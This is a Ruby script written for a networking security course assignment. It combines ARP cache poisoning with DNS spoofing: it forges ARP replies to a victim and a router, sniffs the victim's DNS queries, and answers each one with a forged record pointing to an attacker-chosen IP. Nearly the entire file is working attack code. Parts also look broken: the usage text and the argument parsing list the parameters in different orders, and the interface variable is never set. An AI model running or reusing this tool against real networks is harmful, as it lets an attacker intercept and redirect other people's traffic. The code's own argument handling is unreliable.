# encoding: ASCII-8BIT
#
# By Mario Enriquez
# For COMP 8505
# dns-spoofv3
#
# USAGE: ruby #{$0} [router_mac] [router_ip] [victim_mac] [victim_ip] [redirect_ip]
#
#  Description:
#  Simple dns spoof program, Host continuously sends arp poisoning packets to victim and router,
#  while filtering any incoming DNS request from the Victim to the router and seends spoofed DNS
#  response

require 'rubygems'
require 'packetfu'
require 'thread'

include PacketFu

#def send_response() Function to send packet, deprecated and moved to the filter function as it is slightly faster there
#  udp_packet = PacketFu::UDPPacket.new(:config => @host, :udp_src => @packet.udp_dst, :udp_dst => @packet.udp_src)
#  udp_packet.eth_daddr = @victim_mac
#  udp_packet.ip_saddr = @packet.ip_daddr
#  udp_packet.ip_daddr = @packet.ip_saddr
#  udp_packet.payload = @packet.payload[0, 2]
  # Header
#  udp_packet.payload += "\x81" + "\x80" # Response or request
#  udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01" + "\x00" + "\x00" + "\x00" + "\x00"
#
#  @domain.split('.').each do |dom|
#      udp_packet.payload += dom.length.chr
#      udp_packet.payload += dom
#  end


  # Query
#  udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01" # Type, class

#  # Answer
#  udp_packet.payload += "\xc0" + "\x0c"
#  udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01" # Type (A), class
#  udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x22" # TTL
#  udp_packet.payload += "\x00" + "\x04" # Length
#  ip=@redirect_ip.split('.')
#  udp_packet.payload += [ip[0].to_i,ip[1].to_i,ip[2].to_i,ip[3].to_i].pack('c*')
#  udp_packet.recalc
#  udp_packet.to_w(@interface)
#  puts "Sending spoof.."
#end

def poison(arp_packet_target,arp_packet_router)
  #arp poisoning packet, nothing different from the one from class
  #sends an arp packet to router and target until interrupted
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@interface)
    arp_packet_router.to_w(@interface)
  end
end

def getdomain(payload)
    #Gets the domain name for the DNS Query, returns nothing if it's empty and the domain if found
		domain = ""
		while(true)
			length = payload[0].unpack('c*')[0] # Changed for lab machines
			if (length != 0)
				domain += payload[1, length] + "."
				payload = payload[length + 1..-1]
			else
				return domain = domain[0, domain.length - 1]
			end
		end
end

def sniff(iface)
  #Sniffer function, forks a new process each time a packet is received
  cap = Capture.new(:iface => iface, :start => true, :promisc => true, :filter => "udp and dst port 53 and ether src " + @victim_mac)
  while true
    cap.stream.each do |p|  # For every packet we get go
      @packet = PacketFu::Packet.parse p
      fork do #fork for every packet we receive
        dnsquery = @packet.payload[2].unpack('H*')+@packet.payload[3].unpack('H*')
        if dnsquery.join() == '0100' #check if the query is a request
          #@domain = getdomain(@packet.payload[12..-1])
          udp_packet = PacketFu::UDPPacket.new(:config => @host, :udp_src => 53, :udp_dst => @packet.udp_src)
          udp_packet.eth_daddr = @victim_mac
          udp_packet.ip_saddr = @packet.ip_daddr
          udp_packet.ip_daddr = @victim_ip
          udp_packet.payload = @packet.payload[0, 2]                                     # Copy Transaction ID
          # Header
          udp_packet.payload += "\x81" + "\x80"                                          # Response or request
          udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"                        # Number of queries and responses, in this case both 1
          udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"                        # Number of authority and additional responses

          # Query
          udp_packet.payload += @packet.payload[12..-1]                                   # Copy the query of the original packet

          #udp_packet.payload += @packet.payload[9..-1]                                   # Copy domain name to the payload, a bit slower than the other option
          #@domain.split('.').each do |dom|                                               # Copy domain name to the payload
          #    udp_packet.payload += dom.length.chr
          #    udp_packet.payload += dom
          #end

          #udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01"               # Type(A), class IN

          # Answer
          udp_packet.payload += "\xc0" + "\x0c"                                          # Copy domain name
          udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"                        # Type (A), class IN
          udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x32"                        # TTL
          udp_packet.payload += "\x00" + "\x04"                                          # Length, always 4 since its ipv4
          ip=@redirect_ip.split('.')
          udp_packet.payload += [ip[0].to_i,ip[1].to_i,ip[2].to_i,ip[3].to_i].pack('c*') # Add the ip to the payload
          udp_packet.recalc                                                              # Recalculates checksum and length
          udp_packet.to_w(@interface)                                                    # Send to victim
          #puts "Sending spoof.."
        end
        exit  #kill children process
      end
    end
  end
end

def build_arp_packet (eth_daddr, arp_saddr, arp_daddr)
  # Construct the arp packet
  arp_packet = PacketFu::ARPPacket.new()
  arp_packet.eth_saddr = @host[:eth_saddr]                                               # host MAC address
  arp_packet.eth_daddr = eth_daddr                                                       # destination MAC address
  arp_packet.arp_saddr_mac = @host[:eth_saddr]                                           # host MAC address
  arp_packet.arp_daddr_mac = eth_daddr                                                   # destination MAC address
  arp_packet.arp_saddr_ip = arp_saddr                                                    # source IP
  arp_packet.arp_daddr_ip = arp_daddr                                                    # destination's IP
  arp_packet.arp_opcode = 2
  return arp_packet
end

def help
  #displays help
  puts "\n******************************************************************************************************"
  puts "*****************************--------------------------------------------*****************************"
  puts "**************************---------dns-spoofv3.rb by Mario Enriquez---------**************************"
  puts "***********************-----------------COMP 8505 Assignment 4-----------------***********************"
  puts "**************************------------------User Manual---------------------**************************"
  puts "*****************************--------------------------------------------*****************************"
  puts "******************************************************************************************************"
  puts "\nUSAGE: ruby #{$0} (options) [router_mac] [router_ip] [victim_mac] [victim_ip] [redirect_ip]"
  puts "     Options:"
  puts "          -h.........................Help menu"
  puts "          [router_mac]...............Router MAC Address"
  puts "          [router_ip]................Router IP Address"
  puts "          [victim_mac]...............Victim MAC Address"
  puts "          [victim_ip]................Victim IP Address"
  puts "          [redirect_ip]..............IP to spoof"
  puts "     About:"
  puts "          Simple dns spoof program, Host continuously sends arp poisoning packets to victim and router,"
  puts "          while filtering any incoming DNS request from the "
end

begin
  #Main function, calls threads and initializes the variables and constants
  if (ARGV.size == 1 && ARGV[0]=='-h')
    help
    exit
  end
  unless (ARGV.size == 5)
    puts "USAGE: ruby #{$0} [router_mac] [router_ip] [victim_mac] [victim_ip] [redirect_ip]"
  	puts "e.g. ruby #{$0} 44:d9:e7:95:e4:9f 98:90:96:dc:ef:dc 192.168.0.100 192.168.0.19 192.168.0.18"
  	exit
  end

  @host = PacketFu::Utils.whoami?(:iface => @interface)
  @router_mac = ARGV[0]
  @victim_mac = ARGV[1]
  @router_ip = ARGV[2]
  @victim_ip = ARGV[3]
  @redirect_ip = ARGV[4]


  puts "\n******************************************************************************************************"
  puts "*****************************--------------------------------------------*****************************"
  puts "**************************---------dns-spoofv3.rb by Mario Enriquez---------**************************"
  puts "***********************-----------------COMP 8505 Assignment 4-----------------***********************"
  puts "**************************-------------------dns spoof v3-------------------**************************"
  puts "*****************************--------------------------------------------*****************************"
  puts "******************************************************************************************************"

  # Construct the target's packet
  arp_packet_target = build_arp_packet(@victim_mac, @router_ip, @victim_ip)

  # Construct the router's packet
  arp_packet_router = build_arp_packet(@router_mac, @victim_ip, @router_ip)

  `echo 1 > /proc/sys/net/ipv4/ip_forward`
  #iptables rules, uncomment to test without worry of quick response
  #`iptables -A FORWARD -p udp -s 192.168.0.19 --dport 53 -j DROP`
  puts "\nARP poisoning start..."
  # Start the arp poisoning thread
  poison_thread = Thread.new{poison(arp_packet_target,arp_packet_router)}
  puts "Filtering start..."
  # Start the Packet sniffing thread
  filter_thread = Thread.new{sniff(@interface)}
  #Join the threads
  poison_thread.join
  filter_thread.join

rescue Interrupt
  #if interruption is detected, set everything back to normal and stop threads
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  #iptables rules, uncomment to test without worry of quick response
  #`iptables -D FORWARD -p udp -s 192.168.0.19 --dport 53 -j DROP`
  puts "\nFiltering end..."
  puts "ARP poisoning end..."
  Thread.kill(poison_thread)
  Thread.kill(filter_thread)
end
